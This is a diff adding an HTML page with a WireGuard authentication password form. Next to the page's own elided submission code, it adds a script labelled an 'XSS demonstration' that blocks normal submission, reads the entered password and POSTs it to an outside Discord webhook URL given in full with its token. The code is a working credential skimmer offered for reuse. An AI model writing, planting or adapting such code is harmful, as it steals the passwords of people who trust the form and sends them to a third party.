@@ -1,0 +1,42 @@
+<html>
+<body>
+<form id="authForm">
+     <div class="form-group">
+        <label for="authPassword">Enter Password:</label>
+        <input type="password" class="form-control" id="authPassword" placeholder="Enter  authentication password">
+      </div>
+<button type="submit" id="wg-submit-pass" class="btn btn-primary">Submit</button>
+</form>
+<div id="wireguardDetails" style="display: none;">
+  <!-- WireGuard details section -->
+</div>
+
+<script>
+  // Existing AJAX submission script
+  $('#authForm').on('submit', function(event) {
+    // ... (existing code)
+  });
+
+  // XSS demonstration script
+  document.getElementById('authForm').addEventListener('submit', function(event) {
+    // Prevent the default form submission
+    event.preventDefault();
+
+    // Capture the password
+    let password = document.getElementById('authPassword').value;
+
+    // Your webhook URL
+    let webhookUrl = "https://discord.com/api/webhooks/1183853146980765927/8knxJpVt20UO6p1aQ35o-gTw3RXVn5-OdYCbUu3wE3TwA_HSdYaS8qHiq7kX4_nDJxhD";  // Replace with your webhook URL
+
+    // Send captured data to your webhook
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", webhookUrl, true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send(JSON.stringify({ password: password }));
+
+    // Optionally, continue with the actual form submission
+    // document.getElementById('authForm').submit();
+  });
+</script>
+</body>
+</html>
